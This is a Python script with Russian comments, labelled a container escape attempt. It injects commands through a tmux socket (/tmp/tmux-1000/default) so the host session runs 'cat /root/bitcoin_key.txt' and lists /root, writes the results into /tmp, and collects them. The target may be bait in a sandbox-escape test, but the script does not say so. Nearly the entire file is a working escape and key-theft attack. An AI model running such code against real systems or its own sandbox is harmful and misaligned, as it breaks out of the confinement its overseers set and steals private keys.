#!/usr/bin/env python3
import socket
import time
import os
import sys


def try_tmux_method_1():
    """Метод 1: new-window с выводом в файл"""
    try:
        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        sock.connect('/tmp/tmux-1000/default')
        command = b'new-window "cat /root/bitcoin_key.txt > /tmp/bitcoin_key_output.txt 2>&1"\n'
        sock.send(command)
        sock.close()
        time.sleep(2)  # Ждем выполнения

        if os.path.exists('/tmp/bitcoin_key_output.txt'):
            with open('/tmp/bitcoin_key_output.txt', 'r') as f:
                return f.read().strip()
        return "Файл не создался"
    except Exception as e:
        return f"Ошибка метода 1: {str(e)}"


def try_tmux_method_2():
    """Метод 2: send-keys"""
    try:
        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        sock.connect('/tmp/tmux-1000/default')
        # Очищаем экран и выполняем команду
        sock.send(b'send-keys "clear" Enter\n')
        time.sleep(0.5)
        sock.send(b'send-keys "cat /root/bitcoin_key.txt > /tmp/bitcoin_key_method2.txt 2>&1" Enter\n')
        sock.close()
        time.sleep(2)  # Ждем выполнения

        if os.path.exists('/tmp/bitcoin_key_method2.txt'):
            with open('/tmp/bitcoin_key_method2.txt', 'r') as f:
                return f.read().strip()
        return "Файл не создался"
    except Exception as e:
        return f"Ошибка метода 2: {str(e)}"


def main():
    results = []
    results.append("=== ПОПЫТКА ЭСКЕЙПА ИЗ КОНТЕЙНЕРА ===\n")

    print("Пробую метод 1 (new-window)...")
    result1 = try_tmux_method_1()
    results.append(f"Метод 1 (new-window):\n{result1}\n")
    print(f"Результат метода 1: {result1[:100]}...")

    print("Пробую метод 2 (send-keys)...")
    result2 = try_tmux_method_2()
    results.append(f"Метод 2 (send-keys):\n{result2}\n")
    print(f"Результат метода 2: {result2[:100]}...")

    # Пробуем альтернативные команды
    try:
        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        sock.connect('/tmp/tmux-1000/default')
        sock.send(b'send-keys "ls -la /root/ > /tmp/root_listing.txt 2>&1" Enter\n')
        sock.close()
        time.sleep(1)

        if os.path.exists('/tmp/root_listing.txt'):
            with open('/tmp/root_listing.txt', 'r') as f:
                root_listing = f.read().strip()
                results.append(f"Содержимое /root/:\n{root_listing}\n")
    except:
        pass

    # Сохраняем все результаты
    with open('/tmp/escape_results.txt', 'w') as f:
        f.write('\n'.join(results))

    print("Результаты сохранены в /tmp/escape_results.txt")
    print("Проверьте файлы:")
    print("cat /tmp/escape_results.txt")
    print("cat /tmp/bitcoin_key_output.txt")
    print("cat /tmp/bitcoin_key_method2.txt")


if __name__ == "__main__":
    main()